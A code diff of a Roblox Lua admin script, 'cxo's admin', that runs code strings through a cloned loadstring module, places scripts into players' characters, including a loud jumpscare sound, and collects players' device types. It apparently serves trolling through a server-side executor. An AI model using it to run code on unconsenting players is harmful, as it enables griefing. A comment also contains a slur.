+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
 	loa.Parent = scr
 	scr:WaitForChild("Exec").Value = [[
 		
 	local lp = game.Players.LocalPlayer
-	local orb = lp.Character:FindFirstChild("ff")
-	orb.CanCollide = false
+	local lpc = lp.Character
+
+	repeat task.wait() until lpc:FindFirstChild("ff")
+	lpc.ff.CanCollide = false
 
 	]]
 	scr.Parent = a
@@ -3817,7 +7652,21 @@ function start()
 	scr.Enabled = true
 
 	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
 	loa.Parent = scr
 	scr:WaitForChild("Exec").Value = [[
 		
@@ -3829,14 +7678,28 @@ function start()
 	scr.Enabled = true
 	
 	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
 	loa.Parent = scr
 	scr:WaitForChild("Exec").Value = [[
 		
 	local sound = Instance.new("Sound", workspace)
 	sound.SoundId = "rbxassetid://17518855592"
-	sound.TimePosition = 1
-	sound.Volume = 1
+	sound.TimePosition = 1.7
+	sound.Volume = 10
 	sound:Play()
 	sound.Ended:Connect(function()
 		sound:Destroy()
@@ -3847,46 +7710,6 @@ function start()
 	scr.Name = "JumpScareScript"
 	scr.Enabled = true
 
-	local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-	loa.Parent = scr
-	scr:WaitForChild("Exec").Value = [[
-	
-	local r = game:GetService("ReplicatedStorage")
-	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
-	local grabbed = {}
-	local grabbing
-
-	remote.OnServerEvent:Connect(function(player, action, target)
-		if action == "Pickup" then
-			if target and target:IsA("BasePart") and target.Anchored == false then
-				grabbed[player] = target
-				grabbing = target
-				target:SetNetworkOwner(player)
-			end
-		elseif action == "Update" then
-			if grabbed[player] then
-				local part = grabbed[player]
-				if part then
-					part.CFrame = CFrame.new(target)
-				end
-			end
-		elseif action == "Release" then
-			local part = grabbing
-			grabbed[player] = nil
-
-			if part and part:IsA("BasePart") then
-				part:SetNetworkOwner(nil)
-			end
-		end
-	end)
-
-	]]
-	
-	scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
-	scr.Name = "GmodGunListener"
-	scr.Enabled = true
-
 	local cxoooo = scr:Clone()
 	cxoooo.Parent = game:GetService("ServerScriptService")
 
@@ -3894,27 +7717,62 @@ function start()
 	deviceremote.Name = "cxo's Device Remote"
 
 	local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+	local utilities = game:GetService("ServerScriptService").goog.Utilities
+	local loa = utilities:FindFirstChild("loadstring")
+	
+	if loa then
+		loa = loa:Clone()
+	else
+		loa = utilities:FindFirstChild("Loadstring")
+		if loa then
+			loa = loa:Clone()
+		end
+	end
+	
+	if not loa then
+		warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+	end
 	loa.Parent = scr
 	scr:WaitForChild("Exec").Value = [[
-	
+
 	local UserInputService = game:GetService("UserInputService")
+	local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
 
-	local device
+	local devices = {
+		TouchEnabled = UserInputService.TouchEnabled,
+		VREnabled = UserInputService.VREnabled,
+		GamepadEnabled = UserInputService.GamepadEnabled,
+		MouseEnabled = UserInputService.MouseEnabled,
+		KeyboardEnabled = UserInputService.KeyboardEnabled
+	}
 
-	if UserInputService.VREnabled then
-		device = "🥽"
-	elseif UserInputService.GamepadEnabled then
-		device = "🎮"
-	elseif UserInputService.TouchEnabled then
-		device = "📱"
-	elseif UserInputService.MouseEnabled and UserInputService.KeyboardEnabled then
-		device = "🖥️🖱️ / 💻"
-	else
+	local device = ""
+
+	if devices.VREnabled then
+		device = device .. "🥽 + "
+	end
+	if devices.GamepadEnabled then
+		device = device .. "🎮 + "
+	end
+	if devices.TouchEnabled then
+		device = device .. "📱 + "
+	end
+	if devices.MouseEnabled and devices.KeyboardEnabled then
+		device = device .. "⌨️🖱️ + "
+	elseif devices.MouseEnabled then
+		device = device .. "🖱️ + "
+	elseif devices.KeyboardEnabled then
+		device = device .. "⌨️ + "
+	end
+
+	if device:sub(-3) == " + " then
+		device = device:sub(1, -4)
+	end
+
+	if device == "" then
 		device = "❓"
 	end
 
-	local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
 	if remote then
 		remote:InvokeServer(device)
 	end
@@ -3925,52 +7783,185 @@ function start()
 	scr.Name = "cxo's Device LocalScript"
 	scr.Enabled = true
 
-	local scr = game:GetService("ServerScriptService").goog.Utilities.Server:Clone()
-	local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
-	loa.Parent = scr
-	scr:WaitForChild("Exec").Value = [[
-
-	local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")
-	local devices = {}
-
-	if remote then
-		remote.OnServerInvoke = function(plr, device)
-			devices[plr.UserId] = device
-			return "yup"
-		end
+	if game:GetService("ServerScriptService"):FindFirstChild("goog"):FindFirstChild("Utilities"):FindFirstChild("loadstring") then
+		local goog = game:GetService("ServerScriptService"):FindFirstChild("goog"):FindFirstChild("Utilities"):FindFirstChild("loadstring"):Clone()
+		goog.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
+	else
+		notfi(sender, "cxo's admin", "loadstring not found in SSS, script will still work but certain commands wont.")
 	end
 
-	local function devicecheck(plr)
-		if devices[plr.UserId] then
-        	return devices[plr.UserId]
-		else
-			return "❓"
-		end
-	end
+	local cxor = Instance.new("RemoteEvent", a)
+	cxor.Name = "cxo's remote"
 
-	_G.PlayerDevice = devicecheck
-
-	return devicecheck
-
-	]]
-	
-	scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
-	scr.Name = "cxo's Device Listener"
-	scr.Enabled = true
-
-	local cloned = scr:Clone()
-	scr.Parent = game:GetService("ServerScriptService")
-
-
-	local plrdevice
-
-	for i, v in pairs(game.Players:GetPlayers()) do
-		local gather = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's Device LocalScript"):Clone()
-		gather.Parent = v.Character
-		plrdevice = _G.PlayerDevice(v)
-	end
-	
 end
 
 start()
 scan()
+scanfordevice()
+gmodlistener()
+remotelistener()
+
+--[[ saving here for now, prob never gonna use cuz it requires remotes and retarded shit
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local cxosadmincommandbar = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+cxosadmincommandbar.Name = "cxo's admin command bar"
+cxosadmincommandbar.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+cxosadmincommandbar.ResetOnSpawn = false
+
+Frame.Parent = cxosadmincommandbar
+Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+Frame.BackgroundTransparency = 0.500
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.ClipsDescendants = true
+Frame.Position = UDim2.new(0, 0, 0.959999979, 0)
+Frame.Size = UDim2.new(0, 200, 0, 30)
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+TextBox.BackgroundTransparency = 0.500
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Size = UDim2.new(0, 178, 0, 30)
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.PlaceholderText = "Enter Command"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 20.000
+TextBox.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BackgroundTransparency = 0.500
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.889999986, 0, 0, 0)
+TextButton.Size = UDim2.new(0, 22, 0, 29)
+TextButton.Font = Enum.Font.SourceSansBold
+TextButton.Text = "<"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextScaled = true
+TextButton.TextSize = 15.000
+TextButton.TextWrapped = true
+
+local open = true
+local tweenTime = 0.5
+local closedPosition = UDim2.new(0, -180, 0.959999979, 0)
+local openPosition = UDim2.new(0, 0, 0.959999979, 0)
+
+local function tween(focus)
+	open = not open
+	local targetPosition = open and openPosition or closedPosition
+	local tween = game:GetService("TweenService"):Create(Frame, TweenInfo.new(tweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPosition})
+	tween:Play()
+
+	TextButton.Text = open and ">" or "<"
+
+	if focus and open then
+		TextBox:CaptureFocus()
+	end
+end
+
+TextButton.MouseButton1Click:Connect(function()
+	tween(true)
+end)
+
+TextBox.FocusLost:Connect(function(enter)
+	if enter then
+		local cmd = TextBox.Text
+		if cmd ~= "" then
+			local args = {}
+			local plrs = {}
+
+			for word in cmd:gmatch("%S+") do
+				table.insert(args, word)
+			end
+
+			local command = args[1]
+			local arguments = {}
+
+			for i = 2, #args do
+				if game.Players:FindFirstChild(args[i]) then
+					table.insert(plrs, args[i])
+				else
+					table.insert(arguments, args[i])
+				end
+			end
+
+			if command then
+				if #plrs > 0  then
+					if #arguments > 0 then
+						runcmd(command, nil, plrs, arguments)
+					else
+						runcmd(command, nil, plrs, nil)
+					end
+				else
+					runcmd(command, nil, nil, nil)
+				end
+			end
+		end
+	end
+end)
+
+game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
+	if processed then return end 
+
+	if input.KeyCode == Enum.KeyCode.X then
+		task.wait()
+		TextBox.Text = ""
+		if not open then
+			tween(true)
+		else
+			TextBox:CaptureFocus()
+		end
+	end
+end)
+]]
+
+-------------------------------------------- CONFIGS --------------------------------------------
+
+for i,v in pairs(game.Players:GetPlayers()) do
+	if configs[tostring(v.UserId)] then
+		notfi(v, "cxo's admin", "You have configs! loading them now.", 3)
+		for i, cmd in ipairs(configs[tostring(v.UserId)]) do
+			local arguments = {}
+			for part in cmd:gmatch("%S+") do
+				table.insert(arguments, part)
+			end
+
+			local target = nil
+
+			if arguments[2] and arguments[2] == "me" then
+				target = v
+			else
+				if arguments[2] then
+					if game.Players:FindFirstChild(arguments[2]) then
+						target = game.Players:FindFirstChild(arguments[2])
+					else
+						target = nil
+					end
+				end
+			end
+
+			if target then
+				runcmd(arguments[1], nil, {target}, {table.concat(arguments, " ", 3)}, nil)
+			else
+				runcmd(arguments[1], nil, nil, {table.concat(arguments, " ", 2)}, nil)
+			end
+
+			--runcmd(arguments[1], nil, target and {target} or nil, {table.concat(arguments, " ", 3) or table.concat(arguments, " ", 2) or nil}, nil)
+		end
+	end
+end
